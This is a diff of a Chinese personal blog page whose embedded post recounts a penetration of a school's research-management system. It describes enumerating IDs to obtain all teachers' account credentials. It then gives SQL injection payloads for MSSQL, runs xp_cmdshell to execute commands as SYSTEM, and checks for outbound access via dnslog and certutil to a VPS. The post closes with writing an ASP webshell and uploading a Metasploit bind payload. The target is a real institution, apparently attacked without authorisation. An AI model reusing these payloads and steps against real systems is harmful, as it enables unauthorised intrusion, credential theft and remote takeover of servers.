@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>记一次校内的XX系统渗透 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="记一次校内的XX系统渗透 |   » Feed" href="http://localhost:4000/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="记一次校内的XX系统渗透 |   » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="记一次校内的XX系统渗透"/>
-    <meta property="og:url" content="http://localhost:4000/post/vEdQgLooM/"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/vEdQgLooM/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="http://localhost:4000"> </a>
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,7 +80,7 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="http://localhost:4000/tag/EfzSPkBWE/" class="tag">渗透测试</a>
+            <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">渗透测试</a>
             
         </span>
             <h1>记一次校内的XX系统渗透</h1>
@@ -100,22 +100,22 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>首先进入主页是这个样子<br>
-<img src="http://localhost:4000/post-images/1603887412318.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603887412318.png" alt="" loading="lazy"><br>
 F12也没找到啥接口。爆破也没出来。注入也无。。。。陷入僵局。<br>
 然后继续翻IP。搜到一个人力资源管理系统<br>
-<img src="http://localhost:4000/post-images/1603887529312.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603887529312.png" alt="" loading="lazy"><br>
 F12有惊喜。这里背景图片居然是download+id。<br>
-<img src="http://localhost:4000/post-images/1603887556732.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603887556732.png" alt="" loading="lazy"><br>
 然后顺势遍历一波ID。TM居然拿到了全校老师的账号密码？？？？？<br>
 拿到账号密码。回去科研管理系统登陆一波<br>
 所有功能都点一遍。熟悉下环境<br>
-<img src="http://localhost:4000/post-images/1603887757476.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603887757476.png" alt="" loading="lazy"><br>
 看这URL。。有点熟悉。这套系统还是Asp的。。后端应该就是IIS+Asp+SqlServer<br>
-<img src="http://localhost:4000/post-images/1603887838896.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603887838896.png" alt="" loading="lazy"><br>
 熟悉了下语句。后端应该是<br>
 <code>select xxxx from xxxx where 1=1 +and+left(CheckResult,2)&gt;=12++and+(*,*+AllUsers+*,*+like+*~,10432,~*+)+ and ProjLevel=*03*</code><br>
 上语句。看看能不能报错注入。<br>
-<img src="http://localhost:4000/post-images/1603887970568.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603887970568.png" alt="" loading="lazy"><br>
 成功带出数据<br>
 然后就查当前用户(dbo)，查库查表</p>
 <pre><code>查库
@@ -129,7 +129,7 @@ strWhere=1=convert(int,(select name from master..sysdatabases for xml path))--
 <pre><code>trWhere=1=0;exec master..xp_cmdshell 'whoami';--
 </code></pre>
 <p>啊这没回显。<br>
-<img src="http://localhost:4000/post-images/1603888258186.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603888258186.png" alt="" loading="lazy"><br>
 用dnslog验证下。。这里简单说一下坑点</p>
 <pre><code>exec master..xp_cmdshell 'ping xxxxxxx';
 虽然接到了请求。但是请求的IP查出来是google的节点服务器？？？？
@@ -144,7 +144,7 @@ trWhere=1=(select  tmp1 from tt_tmp where id=1)--
 //通过id查询
 </code></pre>
 <p>Mssql的xp_cmdshell执行时。会把\n单独一行。。所以这里用ID具体查询。<br>
-<img src="http://localhost:4000/post-images/1603888692853.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603888692853.png" alt="" loading="lazy"><br>
 执行下whoami。发现是System权限。那么直接写个webshell。<br>
 之前用certutil请求VPS。没收到。DNS也迷惑。感觉是不出网。学生网段和服务器网段也不能直通。。只想到写shell了<br>
 首先dir c:\ D:\ e:\。发现e:\科研管理系统<br>
@@ -159,7 +159,7 @@ URL输入的是UTF-8。服务端却是GBK。所以嘚转一下。解密后URL编
 <pre><code>base64.b64encode(&quot;科研管理系统&quot;.encode(&quot;gbk&quot;))
 </code></pre>
 <p>然后继续找啊找。发现了web目录<br>
-<img src="http://localhost:4000/post-images/1603889175644.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1603889175644.png" alt="" loading="lazy"><br>
 然后写shell又被恶心到了<br>
 xp_cmdshell的单引号不解析我的URL编码,但是双引号解析？？？？这我记得是浏览器会自动解析的啊。。<br>
 然后asp一句话又有单引号。尖括号特殊字符</p>
@@ -179,7 +179,7 @@ xp_cmdshell是system权限。传个bind msf马。xp_cmdshell执行下<br>
 
           
           <p class="next-post">下一篇：
-            <a href="http://localhost:4000/post/E7S2ehXp7/">
+            <a href="https://guokeya.github.io/post/E7S2ehXp7/">
               <span class="post-title">
                 N1CTF Docker_manager(CURL参数注入)&rarr;
               </span>
@@ -223,7 +223,7 @@ xp_cmdshell是system权限。传个bind msf马。xp_cmdshell执行下<br>
             
               
               <li class="list-inline-item">
-              <a href="http://localhost:4000/atom.xml" target="_blank">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -238,10 +238,10 @@ xp_cmdshell是system权限。传个bind msf马。xp_cmdshell执行下<br>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
